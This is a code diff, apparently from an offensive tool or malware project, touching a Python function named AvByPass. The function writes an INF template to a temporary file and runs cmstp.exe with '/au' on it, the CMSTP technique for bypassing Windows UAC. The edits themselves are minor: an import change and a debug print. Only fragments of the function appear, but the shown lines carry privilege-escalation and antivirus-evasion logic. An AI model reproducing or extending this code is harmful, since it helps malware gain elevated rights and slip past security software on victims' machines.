@@ -11,7 +11,7 @@
 #-----------------------------------------------------------------------------#
 
 
-import tempfile
+from tempfile import gettempdir
 import ctypes
 import time
 from ctypes.wintypes import *
@@ -19,6 +19,7 @@ from ctypes import *
 import os, sys
 
 def AvByPass():
+    print("AvByPass")
     appdata = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
     if os.path.isfile(appdata+'\\.system'):
         return
@@ -183,7 +184,7 @@ def AvByPass():
 
 
     def uacMethod13_cleanup():
-        try: os.remove(os.path.join(tempfile.gettempdir(), 'tmp.ini'))
+        try: os.remove(os.path.join(gettempdir(), 'tmp.ini'))
         except: return False
 
 
@@ -213,7 +214,7 @@ def AvByPass():
 
     def uacMethod():
         try:
-            with open(os.path.join(tempfile.gettempdir(), 'tmp.ini'), 'w') as ini_file:
+            with open(os.path.join(gettempdir(), 'tmp.ini'), 'w') as ini_file:
                 ini_file.write(inf_template)
         except:
             return False
@@ -224,7 +225,7 @@ def AvByPass():
 
         time.sleep(1)
 
-        process().create("cmstp.exe", params="/au {tmp_path}".format(tmp_path=os.path.join(tempfile.gettempdir(), "tmp.ini")), window=False)
+        process().create("cmstp.exe", params="/au {tmp_path}".format(tmp_path=os.path.join(gettempdir(), "tmp.ini")), window=False)
 
         time.sleep(1)
 
